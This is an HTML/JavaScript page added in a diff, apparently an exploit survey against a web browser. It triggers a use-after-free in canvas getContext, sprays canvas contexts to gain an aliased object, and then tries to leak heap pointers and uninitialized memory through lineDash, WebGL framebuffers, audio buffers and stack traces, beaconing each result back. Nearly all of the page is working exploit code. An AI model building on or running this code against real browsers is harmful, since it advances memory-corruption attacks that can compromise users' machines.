@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V566</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function beacon(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V566-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+window.onerror=function(m,s,l,c){
+  beacon('ONERROR',m+'|'+s+':'+l+':'+c);
+};
+
+beacon('BOOT','V566-infoleak-survey');
+
+// =============================================
+// T1: Error.stack format — check for hex addresses
+// =============================================
+(function(){
+  try{
+    function inner(){ throw new Error('probe'); }
+    function middle(){ return inner(); }
+    function outer(){ return middle(); }
+    try{ outer(); }catch(e){
+      var s=e.stack||'';
+      beacon('T1A','stack-len='+s.length+'|has0x='+(s.indexOf('0x')>=0));
+      // Send first 400 chars of stack
+      beacon('T1B',s.substring(0,400));
+    }
+    // Also check native frame
+    try{ null.x; }catch(e2){
+      beacon('T1C','native-stack='+String(e2.stack).substring(0,400));
+    }
+    // TypeError on DOM object
+    try{ document.createElement('canvas').getContext('2d').arc(); }catch(e3){
+      beacon('T1D','dom-stack='+String(e3.stack).substring(0,400));
+    }
+  }catch(e){beacon('T1','ERR:'+e.message)}
+})();
+
+// =============================================
+// T2: WebGL info strings (RENDERER/VENDOR may leak GPU details)
+// =============================================
+(function(){
+  try{
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(gl){
+      beacon('T2A','webgl=YES');
+      var dbg=gl.getExtension('WEBGL_debug_renderer_info');
+      if(dbg){
+        beacon('T2B','renderer='+gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
+        beacon('T2C','vendor='+gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL));
+      }else{
+        beacon('T2B','no-debug-ext|renderer='+gl.getParameter(gl.RENDERER)+'|vendor='+gl.getParameter(gl.VENDOR));
+      }
+      beacon('T2D','version='+gl.getParameter(gl.VERSION)+'|glsl='+gl.getParameter(gl.SHADING_LANGUAGE_VERSION));
+    }else{
+      beacon('T2A','webgl=NO');
+    }
+  }catch(e){beacon('T2','ERR:'+e.message)}
+})();
+
+// =============================================
+// T3: Performance timer resolution
+// =============================================
+(function(){
+  try{
+    var samples=[];
+    for(var i=0;i<20;i++){
+      var t1=performance.now();
+      var j=0;while(performance.now()===t1)j++;
+      var t2=performance.now();
+      samples.push((t2-t1).toFixed(6));
+    }
+    beacon('T3','resolution='+samples.join(','));
+  }catch(e){beacon('T3','ERR:'+e.message)}
+})();
+
+// =============================================
+// T4: SharedArrayBuffer / Atomics availability
+// =============================================
+(function(){
+  try{
+    var sab=typeof SharedArrayBuffer!=='undefined';
+    var atm=typeof Atomics!=='undefined';
+    beacon('T4','SAB='+sab+'|Atomics='+atm);
+    if(sab){
+      try{
+        var s=new SharedArrayBuffer(64);
+        beacon('T4B','SAB-create=OK|bytes='+s.byteLength);
+      }catch(e2){beacon('T4B','SAB-create-ERR:'+e2.message)}
+    }
+  }catch(e){beacon('T4','ERR:'+e.message)}
+})();
+
+// =============================================
+// T5: Web Audio buffer — check if getChannelData has stale heap data
+// =============================================
+(function(){
+  try{
+    var actx=new (window.AudioContext||window.webkitAudioContext)({sampleRate:44100});
+    var buf=actx.createBuffer(1,1024,44100);
+    var data=buf.getChannelData(0);
+    var nz=0,first=-1,samples=[];
+    for(var i=0;i<data.length;i++){
+      if(data[i]!==0){
+        nz++;
+        if(first<0)first=i;
+        if(samples.length<5)samples.push('i'+i+'='+data[i]);
+      }
+    }
+    beacon('T5','audioNZ='+nz+'|first='+first+'|samples='+samples.join(','));
+    actx.close();
+  }catch(e){beacon('T5','ERR:'+e.message)}
+})();
+
+// =============================================
+// T6: Establish alias + scan ALL float fields for pointer-like values
+// =============================================
+function heapWarmup768(){
+  var w=[];
+  for(var i=0;i<100;i++){var c=document.createElement('canvas');c.width=1;c.height=1;w.push(c.getContext('2d'));}
+  w=null;
+  var f=[];
+  for(var i=0;i<50;i++){var c=document.createElement('canvas');c.width=1;c.height=1;f.push(c.getContext('2d'));}
+  return f;
+}
+function triggerUAF(){
+  var outer=document.createElement('canvas');outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{get:function(){innerCtx=outer.getContext('2d');return true;}});
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx,canvas:outer};
+}
+function massReclaim(w,h){
+  if(!w)w=10;if(!h)h=10;
+  var contexts=[],canvases=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var ctx=c.getContext('2d');ctx.lineWidth=200+i;
+    contexts.push(ctx);canvases.push(c);
+  }
+  return {contexts:contexts,canvases:canvases};
+}
+function lightGC(){for(var g=0;g<5;g++){var j=[];for(var i=0;i<2000;i++)j.push({x:i});j=null;}}
+
+var warmupCtxs=heapWarmup768();
+var u=triggerUAF();
+var r=massReclaim(10,10);
+var lw=u.ctx.lineWidth;
+var idx=Math.round(lw-200);
+beacon('T6A','aliasIdx='+idx+'|lw='+lw);
+
+if(idx<0||idx>=200||lw<200||lw>=400){
+  beacon('FAIL','alias-failed');
+  throw new Error('STOP');
+}
+u.ctx=null;u=null;lightGC();
+var aliasCtx=r.contexts[idx];
+var aliasCvs=r.canvases[idx];
+
+// Read ALL accessible float/numeric properties BEFORE setting anything
+(function(){
+  try{
+    var props={};
+    props.lineWidth=aliasCtx.lineWidth;
+    props.miterLimit=aliasCtx.miterLimit;
+    props.globalAlpha=aliasCtx.globalAlpha;
+    props.lineDashOffset=aliasCtx.lineDashOffset;
+    props.shadowBlur=aliasCtx.shadowBlur;
+    props.shadowOffsetX=aliasCtx.shadowOffsetX;
+    props.shadowOffsetY=aliasCtx.shadowOffsetY;
+    // Transform matrix
+    try{
+      var t=aliasCtx.getTransform();
+      props.ta=t.a;props.tb=t.b;props.tc=t.c;props.td=t.d;props.te=t.e;props.tf=t.f;
+    }catch(e){}
+    // Check each for pointer-like values (>1e10 or NaN or Infinity)
+    var suspicious=[];
+    for(var k in props){
+      var v=props[k];
+      if(v!==v||!isFinite(v)||Math.abs(v)>1e10){
+        suspicious.push(k+'='+v);
+      }
+    }
+    var allVals=[];
+    for(var k in props)allVals.push(k+'='+props[k]);
+    beacon('T6B','props='+allVals.join('|'));
+    beacon('T6C','suspicious='+suspicious.length+'|'+suspicious.join(','));
+  }catch(e){beacon('T6','ERR:'+e.message)}
+})();
+
+// =============================================
+// T7: lineDash content after save/restore cycle — heap side-channel
+// =============================================
+(function(){
+  try{
+    // Step 1: Set a known gradient as fillStyle (stores RefPtr in State)
+    var grad=aliasCtx.createLinearGradient(0,0,100,100);
+    grad.addColorStop(0,'red');grad.addColorStop(1,'blue');
+    aliasCtx.fillStyle=grad;
+
+    // Step 2: Set large lineDash (allocates ~4KB heap buffer)
+    var bigDash=[];
+    for(var i=0;i<500;i++) bigDash.push(1.0+i*0.001);
+    aliasCtx.setLineDash(bigDash);
+    beacon('T7A','dashSet=500|get='+aliasCtx.getLineDash().length);
+
+    // Step 3: save() — deep-copies State including gradient ref + lineDash buffer
+    aliasCtx.save();
+    beacon('T7B','saved');
+
+    // Step 4: Change lineDash to different size (frees old buffer, allocates new)
+    var smallDash=[5,10];
+    aliasCtx.setLineDash(smallDash);
+    beacon('T7C','smallDash='+aliasCtx.getLineDash().length);
+
+    // Step 5: Allocate objects of ~4KB to reclaim the freed lineDash buffer
+    var reclaimers=[];
+    for(var i=0;i<50;i++){
+      // Create an object that might land in the freed 4000B buffer
+      // CanvasGradient with many stops? No, too small.
+      // String of ~4000 chars? String data is in StringImpl, same heap
+      var s='';for(var j=0;j<500;j++)s+='ABCDEFGH'; // 4000 byte string
+      reclaimers.push(s);
+    }
+    beacon('T7D','reclaimers='+reclaimers.length);
+
+    // Step 6: restore() — pops current state, returns to saved state
+    // Saved state has the ORIGINAL 500-entry lineDash (buffer B2)
+    aliasCtx.restore();
+    var restored=aliasCtx.getLineDash();
+    beacon('T7E','restoredLen='+restored.length);
+
+    // Check if any restored values are corrupted (not our original values)
+    var corrupted=0,corruptSamples=[];
+    for(var i=0;i<restored.length;i++){
+      var expected=1.0+i*0.001;
+      if(Math.abs(restored[i]-expected)>1e-10){
+        corrupted++;
+        if(corruptSamples.length<5){
+          var dv=new DataView(new ArrayBuffer(8));
+          dv.setFloat64(0,restored[i]);
+          var hex='';
+          for(var j=0;j<8;j++) hex+=('0'+dv.getUint8(j).toString(16)).slice(-2);
+          corruptSamples.push('i'+i+'='+hex);
+        }
+      }
+    }
+    beacon('T7F','corrupted='+corrupted+'|samples='+corruptSamples.join(','));
+  }catch(e){beacon('T7','ERR:'+e.message)}
+})();
+
+// =============================================
+// T8: FinalizationRegistry + WeakRef availability
+// =============================================
+(function(){
+  try{
+    var fr=typeof FinalizationRegistry!=='undefined';
+    var wr=typeof WeakRef!=='undefined';
+    beacon('T8','FinReg='+fr+'|WeakRef='+wr);
+  }catch(e){beacon('T8','ERR:'+e.message)}
+})();
+
+// =============================================
+// T9: Canvas toDataURL on undrawn canvas — check for stale pixel data
+// =============================================
+(function(){
+  try{
+    // Multiple canvases of different sizes to probe different size classes
+    var sizes=[{w:1,h:100},{w:10,h:10},{w:1,h:1000},{w:100,h:100}];
+    for(var s=0;s<sizes.length;s++){
+      var tc=document.createElement('canvas');
+      tc.width=sizes[s].w;tc.height=sizes[s].h;
+      var tctx=tc.getContext('2d');
+      var px=tctx.getImageData(0,0,sizes[s].w,sizes[s].h);
+      var nz=0,first=-1;
+      for(var i=0;i<Math.min(px.data.length,4000);i++){
+        if(px.data[i]!==0){nz++;if(first<0)first=i;}
+      }
+      beacon('T9-'+s,sizes[s].w+'x'+sizes[s].h+'|bytes='+px.data.length+'|nz='+nz+'|first='+first);
+    }
+  }catch(e){beacon('T9','ERR:'+e.message)}
+})();
+
+// =============================================
+// T10: Proxy re-entrancy in setLineDash — does the engine allow callbacks?
+// =============================================
+(function(){
+  try{
+    var callbackCount=0;
+    var proxy=new Proxy([1,2,3,4,5], {
+      get:function(target,prop){
+        if(prop==='length'){
+          callbackCount++;
+          return target.length;
+        }
+        if(typeof prop==='string'&&/^\d+$/.test(prop)){
+          callbackCount++;
+          return target[prop];
+        }
+        return target[prop];
+      }
+    });
+    aliasCtx.setLineDash(proxy);
+    var result=aliasCtx.getLineDash();
+    beacon('T10','callbacks='+callbackCount+'|resultLen='+result.length+'|vals='+Array.from(result).join(','));
+  }catch(e){beacon('T10','ERR:'+e.message)}
+})();
+
+// =============================================
+// T11: Object.prototype.toString on internal objects
+// =============================================
+(function(){
+  try{
+    var results=[];
+    results.push('ctx='+Object.prototype.toString.call(aliasCtx));
+    results.push('cvs='+Object.prototype.toString.call(aliasCvs));
+    try{
+      var grad=aliasCtx.createLinearGradient(0,0,1,1);
+      results.push('grad='+Object.prototype.toString.call(grad));
+    }catch(e){}
+    try{
+      var imgd=aliasCtx.createImageData(1,1);
+      results.push('imgd='+Object.prototype.toString.call(imgd));
+      results.push('imgd-data='+Object.prototype.toString.call(imgd.data));
+    }catch(e){}
+    results.push('perf='+Object.prototype.toString.call(performance));
+    beacon('T11',results.join('|'));
+  }catch(e){beacon('T11','ERR:'+e.message)}
+})();
+
+// =============================================
+// T12: Alias health check
+// =============================================
+(function(){
+  try{
+    aliasCtx.lineWidth=42.42;
+    beacon('T12','alias-health|set=42.42|got='+aliasCtx.lineWidth+'|ok='+(aliasCtx.lineWidth===42.42));
+  }catch(e){beacon('T12','ERR:'+e.message)}
+})();
+
+// =============================================
+// T13: WebGL readPixels on incomplete FBO — potential uninitialized data leak
+// =============================================
+(function(){
+  try{
+    var c=document.createElement('canvas');c.width=64;c.height=64;
+    var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(!gl){beacon('T13','webgl=NO');return;}
+
+    // Create an incomplete framebuffer (missing color attachment)
+    var fbo=gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER,fbo);
+    // DON'T attach anything — framebuffer is incomplete
+
+    var status=gl.checkFramebufferStatus(gl.FRAMEBUFFER);
+    beacon('T13A','fbo-status='+status+'|complete='+(status===gl.FRAMEBUFFER_COMPLETE));
+
+    // Try readPixels on incomplete FBO
+    var pixels=new Uint8Array(64*64*4);
+    // Fill with known pattern first
+    for(var i=0;i<pixels.length;i++) pixels[i]=0xAA;
+    gl.readPixels(0,0,64,64,gl.RGBA,gl.UNSIGNED_BYTE,pixels);
+    var err=gl.getError();
+    beacon('T13B','glError='+err);
+
+    // Check if pixels were modified (and if they contain stale data)
+    var unchanged=0,zeroed=0,nonzero=0,samples=[];
+    for(var i=0;i<pixels.length;i++){
+      if(pixels[i]===0xAA) unchanged++;
+      else if(pixels[i]===0) zeroed++;
+      else{
+        nonzero++;
+        if(samples.length<10) samples.push('i'+i+'=0x'+pixels[i].toString(16));
+      }
+    }
+    beacon('T13C','unchanged='+unchanged+'|zeroed='+zeroed+'|nonzero='+nonzero+'|s='+samples.join(','));
+
+    // Now try toDataURL on the WebGL canvas with incomplete FBO
+    gl.bindFramebuffer(gl.FRAMEBUFFER,null); // back to default
+    // Draw nothing, just read back
+    var px2=new Uint8Array(64*64*4);
+    for(var i=0;i<px2.length;i++) px2[i]=0xBB;
+    gl.readPixels(0,0,64,64,gl.RGBA,gl.UNSIGNED_BYTE,px2);
+    var nz2=0,samples2=[];
+    for(var i=0;i<px2.length;i++){
+      if(px2[i]!==0&&px2[i]!==0xBB){
+        nz2++;
+        if(samples2.length<10) samples2.push('i'+i+'=0x'+px2[i].toString(16));
+      }
+    }
+    beacon('T13D','defaultFBO|nonzero='+nz2+'|s='+samples2.join(','));
+
+    // Try context loss + readPixels
+    var loseCtx=gl.getExtension('WEBGL_lose_context');
+    if(loseCtx){
+      loseCtx.loseContext();
+      var px3=new Uint8Array(64*64*4);
+      for(var i=0;i<px3.length;i++) px3[i]=0xCC;
+      gl.readPixels(0,0,64,64,gl.RGBA,gl.UNSIGNED_BYTE,px3);
+      var nz3=0,samples3=[];
+      for(var i=0;i<px3.length;i++){
+        if(px3[i]!==0&&px3[i]!==0xCC){
+          nz3++;
+          if(samples3.length<5) samples3.push('i'+i+'=0x'+px3[i].toString(16));
+        }
+      }
+      beacon('T13E','lostCtx|nonzero='+nz3+'|s='+samples3.join(','));
+    }else{
+      beacon('T13E','no-lose-context-ext');
+    }
+
+    gl.deleteFramebuffer(fbo);
+  }catch(e){beacon('T13','ERR:'+e.message)}
+})();
+
+// =============================================
+// T14: HTMLCanvasElement toDataURL on WebGL canvas after draw error
+// =============================================
+(function(){
+  try{
+    var c=document.createElement('canvas');c.width=32;c.height=32;
+    var gl=c.getContext('webgl');
+    if(!gl){beacon('T14','webgl=NO');return;}
+
+    // Create texture, bind as FBO color, don't allocate storage
+    var tex=gl.createTexture();
+    var fbo=gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER,fbo);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tex,0);
+    // Texture has no storage → incomplete FBO
+
+    // Try toDataURL which calls readPixelsForPaintResults internally
+    gl.bindFramebuffer(gl.FRAMEBUFFER,null);
+    // The default framebuffer should still work for toDataURL
+    var dataUrl=c.toDataURL('image/png');
+    beacon('T14A','toDataURL-len='+dataUrl.length);
+
+    // Create 2D context to decode and scan the PNG data
+    var img=new Image();
+    img.onload=function(){
+      var tc=document.createElement('canvas');tc.width=32;tc.height=32;
+      var tctx=tc.getContext('2d');
+      tctx.drawImage(img,0,0);
+      var px=tctx.getImageData(0,0,32,32);
+      var nz=0,first=-1;
+      for(var i=0;i<px.data.length;i++){
+        if(px.data[i]!==0){nz++;if(first<0)first=i;}
+      }
+      beacon('T14B','decoded|nz='+nz+'|first='+first);
+    };
+    img.onerror=function(){beacon('T14B','img-decode-err');};
+    img.src=dataUrl;
+
+    gl.deleteFramebuffer(fbo);
+    gl.deleteTexture(tex);
+  }catch(e){beacon('T14','ERR:'+e.message)}
+})();
+
+beacon('DONE','V566-complete');
+</script>
+</body></html>
+</content>
+</invoke>
